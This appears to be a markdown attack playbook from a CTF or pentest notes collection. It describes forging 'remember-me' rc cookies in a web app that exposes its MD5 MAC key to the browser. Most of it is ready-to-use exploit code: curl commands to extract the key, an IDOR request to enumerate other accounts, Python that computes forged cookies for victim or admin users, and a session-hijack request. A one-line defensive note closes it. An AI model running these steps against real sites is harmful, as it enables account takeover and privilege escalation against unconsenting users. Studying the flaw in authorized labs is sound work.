# Remember-Me MD5 `rc` Cookie Forge

## Context

Use only in authorized labs, owned apps, in-scope targets, or defensive validation.

Apply when:

- login with “remember me” returns a client-visible key
- JS builds `rc = btoa(userid + '|' + username + '|' + md5(key + userid + username))`
- `userid` is often `base64(numeric_id)`
- a user-info API can be enumerated for other accounts

## Extract Key

```bash
curl -sS -c jar -X POST "https://[host]/login" \
  -d "username=[lowpriv]&password=[pass]&remember=true" \
  | grep -oE 'name="1" value="[a-f0-9]+"'
```

Also check `localStorage` keys `k`, `u`, `e`, `r` after `/js/s.js` runs.

## Confirm Own Cookie Formula

```python
import hashlib, base64, urllib.parse

key = "[key-from-html]"
ui = "Mg=="          # example: base64 of "2"
username = "john"
mac = hashlib.md5((key + ui + username).encode()).hexdigest()
rc = base64.b64encode(f"{ui}|{username}|{mac}".encode()).decode()
print(rc)
```

Compare to the browser `rc` cookie after remember-me login.

## Find Victim Identity (IDOR)

```bash
curl -sS -b jar -X POST "https://[host]/api/get_info" -d "user_id=[n]"
```

Look for admin-like `display_name` / `user` fields. Do not store live usernames or flags in reusable notes.

## Forge Victim Cookies

```python
import hashlib, base64, urllib.parse

key = "[key]"
user_id = "[n]"
username = "[victim-username]"
ui = base64.b64encode(user_id.encode()).decode()
mac = hashlib.md5((key + ui + username).encode()).hexdigest()
rc = base64.b64encode(f"{ui}|{username}|{mac}".encode()).decode()

# Cookie header (userid often URL-encoded in transit)
print(f"userid={urllib.parse.quote(ui)}; username={username}; rc={rc}")
```

## Restore Session

```bash
curl -sS -b "userid=[urlencoded-ui]; username=[user]; rc=[rc]" \
  -L "https://[host]/login" -o profile.html
grep -E "admin|flag|Welcome" profile.html | head
```

## Expected Signal

```text
Valid forge  -> redirect to profile as victim / admin scope
Bad MAC      -> login form
Wrong username for id -> login form or error
```

## Common Failures

| Failure | Likely cause |
|---------|----------------|
| Login form after forge | wrong key, wrong `ui` encoding, username mismatch |
| MAC matches locally but server rejects | server uses different concatenation order or extra fields |
| Cannot find admin | need broader IDOR range or different API |
| Session works but no flag | flag on another admin-only route |

## Defensive Note

Replace with opaque server-side tokens; never ship MAC keys to the browser; authorize user-info APIs.

## Related

- `notes/remember-me-client-md5-cookie-forge.md`
- `writeups/custos-remember-me-md5-cookie-forge.md`
- `payloads/auth/forged-client-session-role.json.md`
